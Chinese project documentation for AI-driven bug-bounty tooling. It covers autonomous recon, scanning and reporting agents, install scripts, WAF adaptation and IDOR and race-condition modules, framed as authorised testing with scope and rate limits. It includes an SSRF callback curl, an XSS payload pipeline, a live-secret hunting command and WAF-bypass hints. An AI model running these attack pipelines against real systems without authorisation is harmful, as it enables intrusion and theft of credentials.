  model: "deepseek-chat"
```

对话示例：

```
"请对 192.168.1.1 进行端口扫描"
"使用Nuclei扫描 example.com 的漏洞"
"查找 example.com 的子域名"
"对目标进行SQL注入测试"
"用FOFA搜索 domain='target.com' && title='后台'"
```

适合场景： 不想用 Claude Code 订阅的时候，用 DeepSeek（便宜）驱动渗透测试。

### 2. claude-bug-bounty（claude-hunt/）

来源：shuvonsec/claude-bug-bounty（1.8k star）

**是什么：** 专为 Claude Code 设计的全自动 Bug Bounty 猎手框架，覆盖从信息搜集到报告生成的完整流程。

**核心功能：**

8个AI Agent：

| Agent | 功能 |
|-------|------|
| recon-agent | 子域名+活主机+URL发现 |
| report-writer | 生成提交级报告（H1/Bugcrowd/补天格式） |
| validator | 7问门控，杀死弱发现 |
| chain-builder | 发现一个洞后自动查找关联漏洞链 |
| autopilot | 全自动挖洞循环（scope→recon→hunt→validate→report） |
| recon-ranker | 排序攻击面，优先测高价值目标 |
| web3-auditor | 智能合约审计（10种漏洞类） |
| token-auditor | Meme币/Token rug pull检测 |

22个 Slash Commands：

- /recon /hunt /validate /report — 核心四命令
- /autopilot — 全自动模式（--paranoid/--normal/--yolo三种检查点）
- /pickup — 继续上次未完成的目标
- /surface — 排序攻击面
- /intel — CVE情报查询
- /chain — 漏洞链发现
- /scope — 授权范围检查
- /remember — 保存到跨会话记忆
- /secrets-hunt — JS/Git泄露扫描
- /takeover — 子域名接管
- /cloud-recon — 云资产发现
- /bypass-403 — 绕过403
- /scan-cves — Nuclei CVE扫描
- /arsenal — 工具状态检查

20种Web2漏洞类覆盖： IDOR、Auth Bypass、XSS、SSRF、业务逻辑、Race Condition、SQL注入、OAuth、文件上传、GraphQL、LLM/AI、API Misconfig、Account Takeover、SSTI、子域名接管、Cloud/Infra、HTTP Smuggling、Cache Poisoning、MFA Bypass、SAML/SSO

记忆系统：

- hunt-memory/patterns.jsonl — 成功技术跨目标学习
- hunt-memory/audit.jsonl — 请求审计日志
- 自动轮换（10MB上限，保留3个备份）
- 每次会话结束自动记录

MCP集成：

- Burp Suite MCP — AI直接读取浏览器抓包流量
- HackerOne MCP — 查询已披露报告和赏金项目
- Fiddler MCP（我们自己加的） — 分析Fiddler SAZ抓包
- RedOps MCP（我们自己加的） — 调用RedOps执行命令

安全保护：

- Scope Checker — 每个URL发请求前都检查是否在授权范围
- 审计日志 — 每个请求都记录到 audit.jsonl
- 安全方法保护 — PUT/DELETE/PATCH 需要人工确认
- 断路器 — 连续5次403/429自动停止
- 速率限制 — 测试1req/s，信息搜集10req/s

适合场景： 有 Claude Pro/Max 订阅，想全自动挖洞的时候用。AI自动跑全流程，你只需要最后确认报告。

### 两个项目的定位区别

| | RedOps Agent | claude-hunt |
|------|--------------|-------------|
| 驱动模型 | DeepSeek/OpenAI/Qwen（便宜） | Claude Code（需Pro订阅） |
| 交互方式 | Web对话界面 | 终端命令行 |
| 自动化程度 | 对话式，你说一步它做一步 | /autopilot 全自动 |
| 记忆系统 | 会话级记忆 | 跨会话持久化 |
| 安全保护 | 基础 | 完整（scope checker+audit+断路器） |
| 适合谁 | 不想付Claude订阅的 | 想全自动最高效率的 |
| 启动 | python redops/main.py | claude → /autopilot |

最佳组合： Claude Code 做决策 + 通过 RedOps MCP 调用 RedOps 执行命令（省Claude token）。

---

## 2025-06-18 新增工具说明

### 新增工具总览（按攻击阶段）

本次更新补全了黑盒 SRC 测试链路中所有缺失环节，从"只能扫"升级到"能验证+能发现隐藏参数+能检测泄露+能推送通知"。

| 优先级 | 工具 | 阶段 | 一句话说明 | 安装方式 |
|--------|------|------|-----------|----------|
| P0 | interactsh-client | OOB验证 | SSRF/XXE/RCE带外回调验证，没它SSRF只是"疑似" | go install |
| P0 | paramspider | 参数发现 | 从WebArchive被动挖历史URL中的参数 | pip install |
| P0 | arjun | 参数发现 | 主动探测隐藏参数（登录后页面也能用） | pip install |
| P1 | uncover | 资产搜索 | 一条命令查Shodan/Censys/FOFA/ZoomEye | go install |
| P1 | trufflehog | 密钥泄露 | 扫Git仓库+验证密钥是否仍有效（减少误报） | go install |
| P1 | gitleaks | 密钥泄露 | 和trufflehog互补，规则库不同 | go install |
| P1 | alterx | 子域名变异 | 已知dev.xxx.com→自动生成staging/test/uat变种 | go install |
| P1 | notify | 推送通知 | 高危发现→推送钉钉/企业微信/Telegram | go install |
| P1 | corscanner | CORS检测 | 批量扫CORS错配，SRC常见中危 | pip install |
| P1 | openredirex | 开放重定向 | OAuth场景重定向+token窃取=高危链 | pip install |
| P2 | qsreplace | 管道工具 | URL参数批量替换（配合注入测试） | go install |
| P2 | gf | 管道工具 | URL模式匹配，自动提取可能有XSS/SQLi的参数 | go install |
| P2 | uro | URL去重 | 智能去掉相似URL（比anew更聪明） | go install / pip |
| P3 | pdtm | 工具管理 | ProjectDiscovery全家桶一键更新 | go install |

### 各工具详细用法 + SRC注意事项

#### interactsh-client（P0 — OOB回调验证）

为什么必须装： 没有它你的SSRF永远只是"理论可能"，有了它就是"已验证带外交互"——直接从中危升高危。

```bash
# 启动（获取一个临时回调域名）
interactsh-client

# 输出类似：[INF] Using interactsh server: oast.pro
# 给你一个域名：abc123.oast.pro

# 测试SSRF时把这个域名塞进去
curl "http://target.com/fetch?url=http://abc123.oast.pro"

# 如果interactsh收到回调 → SSRF确认！截图写报告
```

SRC注意：
- 不会触发WAF（目标只是发了一个DNS请求到你的回调域名）
- 每次测试用新的子域名，不要复用
- 可以验证：SSRF、XXE、RCE(DNS外带)、Log4j

#### paramspider + arjun（P0 — 参数发现组合拳）

为什么必须装： URL里没参数就没法测注入。gau/waybackurls只给你历史URL，但很多参数是隐藏的。

```bash
# paramspider — 被动（从WebArchive挖，不碰目标服务器）
paramspider -d target.com
# 输出：带参数的历史URL列表

# arjun — 主动（向目标发探测请求，需要限速）
arjun -u "http://target.com/api/search" --stable
# 输出：发现隐藏参数 q, page, sort, debug

# 组合用法：paramspider找URL → arjun对每个URL探测隐藏参数 → dalfox/手工测注入
```

SRC注意：
- paramspider 完全安全（查第三方数据源，不碰目标）
- arjun 会向目标发请求，但流量很小（每个参数1-2个请求）
- 发现 debug=true 或 admin=1 这种隐藏参数就是洞

#### uncover（P1 — Shodan/FOFA/Censys整合）

为什么推荐： 不用开浏览器登录FOFA，一条命令查所有搜索引擎。

```bash
# 查目标暴露资产
uncover -q "domain:target.com" -e shodan,fofa,censys

# FOFA语法直接用
uncover -q 'domain="target.com" && title="后台"' -e fofa

# 配合httpx验证存活
uncover -q "org:目标公司" -e shodan | httpx -silent
```

配置API Key： 运行安装脚本后编辑 `~/.config/uncover/provider-config.yaml` 填入你的FOFA/Shodan Key。

SRC注意： 查搜索引擎不算攻击行为，完全安全。

#### trufflehog + gitleaks（P1 — 密钥泄露扫描）

为什么推荐： SRC里"泄露AK/SK/Token"直接P1高危，扫一遍GitHub就可能出好几个洞。

```bash
# trufflehog — 扫目标的GitHub组织（自动验证密钥是否有效！）
trufflehog github --org=目标公司 --only-verified

# gitleaks — 扫本地克隆的仓库
gitleaks detect --source /path/to/repo --report-path leaks.json

# 组合用法：trufflehog扫在线仓库 + gitleaks扫本地（规则互补）
```

SRC注意：
- 只扫公开仓库，不扫私有的（除非授权）
- trufflehog的 --only-verified 选项只报告仍然有效的密钥（减少误报）
- 发现有效的AWS Key/数据库密码/支付密钥 = 直接高危

#### notify（P1 — 推送通知）

为什么推荐： nuclei跑了一晚上发现高危，你不用盯着终端看。

```bash
# 配合nuclei使用
nuclei -l targets.txt -severity critical,high | notify -silent

# 配合管道用
subfinder -d target.com | httpx | nuclei -severity high | notify
```

配置： 编辑 `~/.config/notify/provider-config.yaml`，填入钉钉/企业微信/Telegram的webhook。

#### corscanner + openredirex（P1 — 快速出洞）

为什么推荐： CORS错配和开放重定向是SRC最容易批量出洞的类型。

```bash
# CORS错配扫描（批量扫一堆URL）
python3 -m corscanner -i urls.txt -o cors_results.json

# 开放重定向（对有redirect参数的URL自动fuzz）
cat urls_with_redirect.txt | openredirex
```

SRC注意：
- CORS错配一般是中危（如果能读到敏感数据就是高危）
- 开放重定向 + OAuth token窃取 = 高危链
- 这两个工具请求量很小，不容易触发WAF

#### alterx（P1 — 子域名变异）

```bash
# 已知子域名列表 → 生成变种
cat known_subs.txt | alterx -silent | dnsx -silent | httpx

# 示例：已知 dev.target.com → 自动尝试 dev2/staging/test/uat/pre.target.com
```

#### 管道工具组合（P2 — qsreplace + gf + uro）

这三个工具是管道胶水，配合前面的工具串联攻击链：

```bash
# 完整链路示例：
# 1. 收集URL
echo target.com | gau | uro > all_urls.txt

# 2. 用gf提取可能有XSS的URL
cat all_urls.txt | gf xss > xss_candidates.txt

# 3. 用qsreplace替换参数值为payload
cat xss_candidates.txt | qsreplace '"><script>alert(1)</script>' > xss_test.txt

# 4. 用dalfox验证
cat xss_test.txt | dalfox pipe --worker 2 --delay 300
```

### 安装脚本说明

| 脚本 | 平台 | 用法 |
|------|------|------|
| claude-hunt/install_tools_windows.ps1 | Windows | 右键PowerShell管理员 → .\install_tools_windows.ps1 |
| claude-hunt/install_tools_linux.sh | Linux/Kali | sudo bash claude-hunt/install_tools_linux.sh |
| claude-hunt/install_tools.sh | Mac (Homebrew) | bash claude-hunt/install_tools.sh |

三个脚本功能一致：
- 安装 Go + nmap（如果没有）
- go install 全部 Go 工具（24个）
- pip install Python 工具（7-13个）
- 更新 nuclei 模板
- 生成 notify/uncover 配置模板
- 验证安装结果（分组显示）
- 打印 SRC 限速参数提醒

### 工具更新方式

```bash
# 方式1：用pdtm一键更新所有ProjectDiscovery工具
pdtm -update-all

# 方式2：单独更新某个工具
go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest

# 方式3：重新跑安装脚本（会跳过已安装的）
bash claude-hunt/install_tools_linux.sh
```

---

## 2025-06-18 Windows兼容性修复

### 问题背景

原工具链是 Linux/macOS 优先设计，Windows 上缺失致命依赖导致完全无法运行。

### 修复的致命缺失

| 组件 | 作用 | Windows安装方式 | Linux安装方式 |
|------|------|----------------|--------------|
| Go | 24个Go安全工具的编译运行时 | 脚本自动下载 go1.24.4.windows-amd64.msi 静默安装 | 脚本自动下载tar.gz解压到 /usr/local/go |
| Ollama | 本地LLM引擎，brain.py 核心依赖 | 脚本自动下载 OllamaSetup.exe 静默安装 | curl -fsSL https://ollama.com/install.sh \| sh |
| jq | JSON处理工具（管道数据解析） | 脚本自动下载binary到 %LOCALAPPDATA%\jq\ | apt install jq（已在系统依赖里） |
| nmap | 端口扫描+服务识别 | 脚本自动下载 nmap-7.95-setup.exe 静默安装 | apt install nmap |

### 新增的Python AI/LLM依赖（brain.py需要）

| 包名 | 作用 | 说明 |
|------|------|------|
| ollama | Ollama Python SDK | brain.py 通过这个包调用本地LLM |
| rich | 终端美化输出 | 彩色日志、进度条、表格 |
| langgraph | LLM Agent图引擎 | 构建多步骤AI Agent工作流 |
| langchain-ollama | LangChain + Ollama集成 | 让LangChain调用本地Ollama模型 |
| Pillow | 图像处理 | 截图OCR、验证码识别 |
| selenium | 浏览器自动化 | Playwright的备选方案 |
| beautifulsoup4 | HTML解析 | 页面内容提取 |
| playwright | 无头浏览器 | 自动登录、表单操作、Cookie提取 |

### 新增Go工具

| 工具 | 作用 | 为什么加 |
|------|------|---------|
| subzy | 子域名接管检测 | 比subjack更活跃，指纹库更新 |

### Ollama使用说明

```bash
# 1. 安装完脚本后，拉取模型（约5GB）
ollama pull deepseek-r1:8b

# 2. 启动Ollama服务（Windows会自动后台运行，Linux需要手动）
ollama serve

# 3. 测试是否正常
ollama run deepseek-r1:8b "hello"

# 4. brain.py 会自动连接 localhost:11434 调用模型
```

可选模型：
- deepseek-r1:8b — 推荐，8B参数，16GB显存够用
- qwen2.5:7b — 通义千问，中文更好
- llama3.1:8b — Meta出品，英文强

### 安装后验证

Windows跑完脚本后，在PowerShell里检查：

```
go version          # Go 1.24+
ollama --version    # ollama version x.x.x
jq --version        # jq-1.7.1
nmap --version      # Nmap 7.95
subfinder -version  # v2.x.x
nuclei -version     # v3.x.x
```

Linux跑完脚本后：

```bash
go version && ollama --version && jq --version && nmap --version
subfinder -version && nuclei -version && interactsh-client -version
```

### 完整工具覆盖清单（修复后）

安装脚本跑完后，应该达到：

| 类别 | 数量 | 工具 |
|------|------|------|
| Go安全工具 | 28个 | subfinder, amass, httpx, nuclei, katana, ffuf, dalfox, gau, waybackurls, gospider, dnsx, naabu, interactsh-client, uncover, notify, alterx, pdtm, trufflehog, gitleaks, subjack, subzy, crlfuzz, hakrawler, gowitness, anew, gf, qsreplace, kiterunner |
| Python安全工具 | 7个 | paramspider, arjun, wafw00f, corscanner, openredirex, linkfinder, uro |
| Python AI/框架 | 7个 | ollama, rich, langgraph, langchain-ollama, Pillow, selenium, beautifulsoup4 |
| 系统工具 | 4个 | Go, nmap, jq, Ollama |
| 浏览器自动化 | 2个 | playwright + chromium |
| 总计 | 48个 | Windows和Linux通用 |

---

## AI Auto-Hunt Agent（自动化挖掘引擎）

### 简介

`claude-hunt/auto_agent/` 是一个独立的 AI Agent，用 DeepSeek API 驱动全链路 SRC 漏洞挖掘。不依赖 Claude Code 订阅，只需要一个 DeepSeek API Key。

### 核心特性

| 特性 | 说明 |
|------|------|
| 双模式 | 全自动(YOLO) / 半自动(SAFE)，启动时选择 |
| 桌面日志 | 每次运行生成 doing_日期.md 在桌面，记录每步操作 |
| 红线审查 | 每步自动检查是否越界（连续403/404比例/禁止路径） |
| 痕迹分析 | 每N步 AI 分析已有数据，找出可挖线索 |
| 7问验证 | 发现漏洞后 AI 自动做门控验证，过滤误报 |
| 自动报告 | 验证通过的漏洞自动生成中国SRC格式报告到桌面 |
| 限速保护 | 所有命令强制限速，不会打崩目标 |

### 文件结构

```
claude-hunt/auto_agent/
├── auto_hunt.py           # 主入口（启动→选模式→输入目标→跑全流程）
├── agent_engine.py        # AI引擎（DeepSeek调用 + 命令执行 + 决策循环）
├── hunt_logger.py         # 日志（桌面 doing_日期.md，markdown格式）
├── redline_checker.py     # 红线审查（403/404/禁止路径/请求上限）
├── trace_analyzer.py      # 痕迹分析（AI 找可挖线索 + 建议下一步）
├── config.yaml.example    # 配置模板（复制为 config.yaml 填Key）
└── phases/
    ├── base.py            # 阶段基类（步骤执行+日志+红线检查）
    ├── recon.py           # 信息搜集（subfinder→dnsx→httpx→gau→waybackurls）
    ├── params.py          # 参数发现（paramspider→gf→arjun）
    ├── hunt.py            # 漏洞检测（nuclei→dalfox→CORS→trufflehog）
    ├── validate.py        # 漏洞验证（AI 7问门控）
    └── report.py          # 报告生成（中国SRC格式→桌面md文件）
```

### 使用方法

```bash
# 1. 安装依赖
pip install openai pyyaml rich

# 2. 配置
cd claude-hunt/auto_agent
cp config.yaml.example config.yaml
# 编辑 config.yaml 填入 DeepSeek API Key

# 3. 运行（交互式）
python auto_hunt.py

# 4. 或直接指定参数
python auto_hunt.py --target example.com --mode auto   # 全自动
python auto_hunt.py --target example.com --mode semi   # 半自动
```

### 两种模式对比

| | 全自动 (auto/YOLO) | 半自动 (semi/SAFE) |
|------|------|------|
| 阶段切换 | 自动进入下一阶段 | 每个阶段前问你要不要跑 |
| 命令执行 | AI自己决定跑什么命令 | 每条命令执行前让你确认 |
| AI额外探测 | 允许AI自主决定额外命令 | 不执行AI额外建议的命令 |
| 发现高危漏洞 | 暂停让你确认（安全兜底） | 暂停让你确认 |
| 红线触发 | 立即自动停止 | 立即自动停止 |
| 适合场景 | 挂着跑一晚上 | 第一次测新目标，边看边学 |

### 运行流程

```
启动 → 选模式 → 输入目标 → 确认授权
  │
  ├── Phase 1: Recon（信息搜集）
  │     subfinder → dnsx → httpx → gau → waybackurls
  │     └── AI决策是否继续深入
  │
  ├── Phase 2: Params（参数发现）
  │     paramspider → gf(xss/ssrf) → arjun(主动探测)
  │
  ├── Phase 3: Hunt（漏洞检测）
  │     nuclei(高危) → dalfox(XSS) → CORS检测 → trufflehog(密钥)
  │     └── AI决策额外攻击面
  │
  ├── Phase 4: Validate（漏洞验证）
  │     对每个疑似漏洞做 AI 7问门控
  │     └── 发现高危 → 暂停确认
  │
  └── Phase 5: Report（报告生成）
        为每个确认漏洞生成 SRC 提交格式报告 → 保存桌面
```

### 日志输出（doing_日期.md）

每次运行在桌面生成一个 Markdown 日志，内容包括：

- 目标信息、模式、开始时间
- 每条命令的执行记录（命令+输出+AI分析）
- 红线审查结果（通过/警告/停止）
- 痕迹分析（可挖线索+建议）
- 最终汇总（子域名/URL/漏洞数量统计）

### 红线审查规则

| 触发条件 | 行为 |
|---------|------|
| 连续5个 403 响应 | 立即停止（可能被WAF封） |
| 404 比例超过 95% | 立即停止（路径全错或被ban） |
| 碰到禁止路径（/admin/delete等） | 立即停止 |
| 总请求数超过 500 | 立即停止 |
| 响应中出现"人机验证""IP封禁" | 记录警告 |

### 痕迹分析

每5步 AI 自动分析当前所有发现，输出：

- 线索: 哪些URL/参数/子域名看起来有洞
- 建议: 下一步最应该做什么
- 置信度: AI对当前线索的信心程度

### 配置说明（config.yaml）

```yaml
# 必填
llm:
  api_key: "sk-你的DeepSeek-Key"   # DeepSeek API Key
  base_url: "https://api.deepseek.com/v1"
  model: "deepseek-chat"

# 可选调整
rate_limit:
  requests_per_second: 3    # 有WAF降到1
  max_total_requests: 500   # 单次最大请求数

redline:
  max_403_consecutive: 5    # 连续403阈值
  check_interval: 10        # 每N步审查一次

agent:
  trace_analysis_interval: 5  # 每N步做痕迹分析
```

### 注意事项

- 必须有授权 — 启动时会强制确认你有 SRC 授权
- 不用 sqlmap — AI 手工构造注入 payload，每次只发1个请求
- 限速强制 — 所有工具命令都带限速参数，不可绕过
- 日志留痕 — 所有操作全部记录，万一被误会有证据
- 高危暂停 — 即使全自动模式，发现高危也会暂停等你确认
- 需要渗透工具 — 确保先跑了 install_tools_*.sh/ps1 安装完所有工具

---

## 2025-06-18 新增6大功能模块

### 更新后的完整运行流程

```
启动 → 选模式 → 输入目标 → 确认授权
  │
  ├── Phase 0: 前置侦察（新增）
  │     ├── WAF检测 → 动态调整限速/UA
  │     └── 资产关联发现 → FOFA/证书/AI推测子域名
  │
  ├── Phase 1: Recon（信息搜集）
  │     subfinder → dnsx → httpx → gau → waybackurls
  │     └── 每步Session监控（被踢→停，429→降速）
  │
  ├── Phase 2: Params（参数发现）
  │     paramspider → gf(xss/ssrf) → arjun
  │
  ├── Phase 3: Hunt（漏洞检测）——已扩展
  │     ├── nuclei(高危) → dalfox(XSS) → CORS → trufflehog
  │     ├── 【新】并发竞态: AI识别支付/领券接口 → 并发测试
  │     └── 【新】IDOR越权: 双账号Cookie交叉验证
  │
  ├── Phase 4: Validate（7问门控）
  │
  ├── Phase 5: Verify（四证齐全）
  │
  ├── 【新】提交前情报查重 → 避免重复提交
  │
  └── Phase 6: Report（生成报告）
```

### 模块1: WAF 指纹自适应（waf_adapter.py）

功能： 检测目标 WAF 类型，自动调整所有后续工具的限速和请求方式。

| WAF类型 | 检测方式 | 自动调整 |
|---------|---------|---------|
| Cloudflare | wafw00f 检测 | 1 req/s + 浏览器模式 + 随机UA |
| 阿里云WAF | wafw00f 检测 | 1 req/s + 带Cookie + 正常UA |
| 宝塔WAF | wafw00f 检测 | 2 req/s + 可尝试大小写绕过 |
| 腾讯云WAF | wafw00f 检测 | 1 req/s + payload需编码 |
| 无WAF | wafw00f 检测 | 5 req/s + 正常模式 |

自动行为：
- 检测到 WAF 后，所有工具命令自动加上对应的限速参数
- nuclei/httpx/ffuf/dalfox/katana 的 -rate-limit 参数会被动态覆盖
- 随机 UA 池（5个不同浏览器UA轮换）

### 模块2: 账号状态监控（session_monitor.py）

功能： 每N步检查你的测试账号 Session 是否还活着。

为什么需要： SRC 测试最怕的是"账号被风控了自己不知道"，继续发请求等于白费+增加被追溯风险。

工作方式：

```
每10步 → 用你的Cookie访问一个已知正常的URL
  ├── 200 + 预期内容 → Session正常，继续
  ├── 302/301 → 被踢到登录页，立即停止
  ├── 403 连续3次 → IP可能被封，立即停止
  ├── 429 → 触发限速，自动降速
  └── 响应含"验证码/人机验证" → 风控触发，立即停止
```

配置（config.yaml）：

```yaml
session_monitor:
  check_url: "https://target.com/api/user/profile"  # 登录后能访问的URL
  cookie: "session=xxx; token=yyy"                   # 你的Cookie
  expected_keyword: "username"                       # 正常页面应该有的关键词
  check_interval: 10                                 # 每10步检查
```

### 模块3: 资产关联发现（asset_discovery.py）

功能： 从一个域名穿透发现所有关联资产（中国SRC特色）。

发现方式：
- FOFA 证书关联 — cert="target.com" 找同证书的其他域名
- AI 推测子域名 — 根据公司名推测 oa/crm/erp/hr/test/staging
- alterx 变异 — dev.target.com → dev2/staging/pre/uat.target.com
- AI 优先级排序 — 分析哪些域名最可能有洞

配置：

```yaml
target:
  domain: "target.com"
  company_name: "某某科技有限公司"  # 填公司名，AI会推测关联域名
```

### 模块4: 并发竞态自动检测

功能： AI 自动从 URL 列表中识别"可能有竞态"的接口，然后并发测试。

工作方式：

1. AI分析所有URL → 找出 支付/提现/领券/签到/投票 相关接口
2. 对每个目标接口并发发送5个请求
3. 对比响应码：如果多个都是200 → 可能存在竞态
4. 记录证据到日志

触发条件： URL中包含 withdraw/pay/coupon/sign/vote/redeem 等关键词时自动触发。

红线保护： 只并发5次就停，不会反复测试。

### 模块5: IDOR 多账号对比

功能： 配置两个测试账号的 Cookie，Agent 自动找 IDOR 接口并交叉验证。

工作方式：

1. AI从URL中找包含 用户ID/订单号/数字参数 的接口
2. 用 账号A 的Cookie访问 → 记录响应
3. 用 账号B 的Cookie访问同一接口 → 记录响应
4. 如果两个都是200 → 可能存在越权

配置：

```yaml
idor:
  cookie_a: "session=user_a_session_id"   # 账号A
  cookie_b: "session=user_b_session_id"   # 账号B
```

红线保护： 只用自己注册的2个账号，不遍历他人数据。

### 模块6: 历史漏洞情报查重（intel_checker.py）

功能： 出报告前自动查重，避免提交已知漏洞被忽略/扣分。

工作方式：

```
发现漏洞 → AI分析：
  - 这种漏洞在该目标是否属于"已知问题"？
  - 该CMS版本是否有已知CVE覆盖？
  - 补天/漏洞盒子是否可能已有同类提交？
  
输出：
  - 低风险 → 建议提交
  - 中风险 → 建议先搜索平台确认
  - 高风险 → 很可能重复，谨慎提交
```

### 新增配置项汇总（config.yaml）

```yaml
# 账号状态监控
session_monitor:
  check_url: ""           # 登录后可访问的URL
  cookie: ""              # 你的Cookie
  expected_keyword: ""    # 预期关键词
  check_interval: 10

# IDOR 双账号
idor:
  cookie_a: ""            # 账号A Cookie
  cookie_b: ""            # 账号B Cookie

# 资产发现
target:
  company_name: ""        # 公司名（用于关联穿透）
```

### 现在完整的文件结构

```
claude-hunt/auto_agent/
├── auto_hunt.py              # 主入口
├── agent_engine.py           # AI引擎(DeepSeek API)
├── hunt_logger.py            # 桌面日志(doing_日期.md)
├── redline_checker.py        # 红线审查
├── trace_analyzer.py         # 痕迹分析
├── waf_adapter.py            # 【新】WAF自适应
├── session_monitor.py        # 【新】Session监控
├── asset_discovery.py        # 【新】资产关联发现
├── intel_checker.py          # 【新】情报查重
├── config.yaml.example       # 配置模板
└── phases/
    ├── base.py               # 阶段基类
    ├── recon.py              # 信息搜集
    ├── params.py             # 参数发现
    ├── hunt.py               # 漏洞检测【已扩展：竞态+IDOR】
    ├── validate.py           # 7问验证
    ├── verify.py             # 四证齐全
    └── report.py             # 报告生成
```

---

## HexStrike AI 集成（可选增强后端）

### 什么是 HexStrike

HexStrike AI 是一个开源的 MCP 渗透测试框架，封装了 150+ 安全工具，提供：

- 工具参数自动优化（AI选择最佳nmap/nuclei参数）
- 智能缓存（相同目标不重复扫）
- 错误恢复（命令失败自动重试）
- 进程管理（并发控制+超时处理）

### 跟 Auto-Hunt Agent 的关系

```
┌─────────────────────────────────┐
│  Auto-Hunt Agent (AI决策层)     │  ← 你的 DeepSeek AI 做决策
│  红线审查 / Session监控 / 日志  │
│  痕迹分析 / 四证验证 / 报告    │
└──────────────┬──────────────────┘
               │ execute_command()
               ▼
┌─────────────────────────────────┐
│  HexStrike Bridge (路由层)      │  ← hexstrike_bridge.py
│  判断: 走API还是本地执行?       │
└───────┬───────────────┬─────────┘
        │               │
        ▼               ▼
┌──────────────┐  ┌──────────────┐
│ HexStrike    │  │ 本地         │
│ API Server   │  │ subprocess   │
│ (150+工具    │  │ (直接执行)   │
│  参数优化)   │  │              │
└──────────────┘  └──────────────┘
```

简单说：
- 有 HexStrike → 工具命令走 API（更智能的参数+缓存+错误恢复）
- 没有 HexStrike → 直接本地执行（跟以前一样，完全不影响）
- HexStrike 中途掉线 → 自动降级为本地执行（不中断流程）

### 三种使用方式

| 方式 | 适合谁 | 配置 |
|------|--------|------|
| A. 不用HexStrike | 大多数人 | hexstrike.enabled: false（默认） |
| B. 本地跑HexStrike | 想要参数优化+缓存 | 另开终端跑server，改enabled为true |
| C. 远程HexStrike | 有专门的渗透VPS | 改server_url为远程IP |

#### 方式A: 不用 HexStrike（默认）

什么都不用改，config.yaml 里 hexstrike.enabled: false 就行。所有命令直接本地执行。

#### 方式B: 本地跑 HexStrike

```bash
# 终端1: 启动 HexStrike server
git clone https://github.com/0x4m4/hexstrike-ai.git
cd hexstrike-ai
python3 -m venv hexstrike-env
source hexstrike-env/bin/activate
pip3 install -r requirements.txt
python3 hexstrike_server.py
# 看到 "Server starting on 127.0.0.1:8888" 就OK

# 终端2: 跑你的 Auto-Hunt Agent
cd claude-hunt/auto_agent
# 编辑 config.yaml:
#   hexstrike:
#     enabled: true
#     server_url: "http://127.0.0.1:8888"
python auto_hunt.py --target example.com --mode semi
```

#### 方式C: 远程 HexStrike（渗透VPS）

```yaml
# config.yaml
hexstrike:
  enabled: true
  server_url: "http://你的VPS-IP:8888"
  timeout: 180        # 远程可能慢一点
  fallback_to_local: true
```

### 配置说明

```yaml
hexstrike:
  enabled: false              # true=启用, false=禁用(默认)
  server_url: "http://127.0.0.1:8888"   # HexStrike server地址
  timeout: 120                # 单条命令超时(秒)
  fallback_to_local: true     # server掉线时自动降级为本地执行
```

### 自动路由逻辑

当 enabled: true 且 server 在线时：

1. Agent 要执行 subfinder -d target.com
2. hexstrike_bridge.py 检查: subfinder 在工具映射表里吗？→ 是
3. 通过 HTTP POST 发给 HexStrike API
4. HexStrike 优化参数、执行、返回结果
5. Agent 拿到结果继续下一步

如果 server 掉线：
1. API 调用失败
2. Bridge 标记 is_available = False
3. 自动 fallback 到本地 subprocess.run()
4. 后续命令全部本地执行
5. 日志记录 [via: local] 标记

### HexStrike 带来的额外能力

| 能力 | 没有HexStrike | 有HexStrike |
|------|-------------|------------|
| 工具参数 | 你自己写/AI建议 | HexStrike AI自动优化 |
| 缓存 | 无（每次重新跑） | 智能缓存（相同目标不重复扫） |
| 错误恢复 | 命令失败就失败 | 自动重试+降级策略 |
| 进程管理 | 简单timeout | 完整进程监控+资源限制 |
| 工具覆盖 | 28个Go+7个Python | 150+工具（含二进制/CTF/云安全） |
| 浏览器Agent | 需要自己写playwright | HexStrike内置Chrome自动化 |

### 注意事项

- HexStrike 完全可选 — 不装不影响任何功能
- 安全性 — HexStrike server 默认只监听 127.0.0.1，不暴露到外网
- 资源占用 — HexStrike server 本身很轻量（Flask），但执行工具时会占资源
- SRC红线 — 你的 Auto-Hunt Agent 的红线/限速/Session监控仍然生效，HexStrike 只是执行层
- 日志区分 — 日志中会标记每条命令是通过 [via: hexstrike] 还是 [via: local] 执行的

---

## 顶层部署文件

| 文件 | 功能 | 说明 |
|------|------|------|
| `README.md` | 项目简介 | 环境要求：Node.js 18+, Python 3.8+, Go 1.20+, Claude Code |
| `know.md` | 完整知识库（1700+ 行） | 项目架构/Google Dorking/业务逻辑漏洞/竞态条件/绕过技巧/工具链参考/红线规则/CNVD双提交/AI Agent指南/Windows兼容性 |
| `Dockerfile` | Docker 容器化 | node:22-alpine 镜像，暴露端口 3000，默认 LLM 设为 OpenAI |
| `docker-compose.yml` | Docker Compose 编排 | 端口映射 3000，环境变量传递（LLM/GitHub/FOFA），健康检查 |
| `launch.cmd` | Windows 启动批处理 | 调用 launch.ps1（Bypass ExecutionPolicy） |
| `launch.ps1` | Windows PowerShell 启动脚本 | 检测 Node.js 18+，自动探测 LLM API Key（OpenAI/Anthropic/Gemini/DeepSeek/Qwen），创建工作目录，启动 server.js |
| `.gitignore` | Git 忽略规则 | node_modules/, workspace/, .env, .env.*, *.log, *.pid, __pycache__/ |
| `.dockerignore` | Docker 忽略规则 | node_modules, .git, *.log, *.md, docs, .DS_Store |

---

## CVE 审计报告样本（cve/）

项目包含 5 份已完成的 CVE 审计报告，可作为白盒审计的参考模板：

| 报告 | 漏洞类型 | 目标组件 |
|------|---------|---------|
| `CVE-Report-egg-RESTfulAPI-01-Hardcoded-JWT-Secret.md` | 硬编码 JWT 密钥 | egg-RESTfulAPI |
| `CVE-Report-egg-RESTfulAPI-02-SSRF-via-Upload-URL.md` | 上传 URL 触发 SSRF | egg-RESTfulAPI |
| `CVE-Report-egg-RESTfulAPI-03-Unauthenticated-CRUD.md` | 未授权 CRUD 操作 | egg-RESTfulAPI |
| `CVE-Report-mongoui-01-NoSQL-Injection.md` | NoSQL 注入 | mongoui |
| `CVE-Report-mongoui-02-No-Authentication.md` | 缺少身份认证 | mongoui |

---

## src/ 白盒审计模块详解

### Agents 审计代理（src/agents/）

| 文件 | 功能 | 核心能力 |
|------|------|---------|
| `auditAnalystAgent.js` | 静态代码分析 Agent | 基于正则的启发式规则检测：越权/查询安全/上传存储/密钥暴露等，对下载的 OSS 项目自动扫描 |
| `fofaScoutAgent.js` | FOFA 资产搜索 Agent | 调用 FOFA API（api.fofa.com），支持域名/标题/特征搜索，返回结构化结果 |
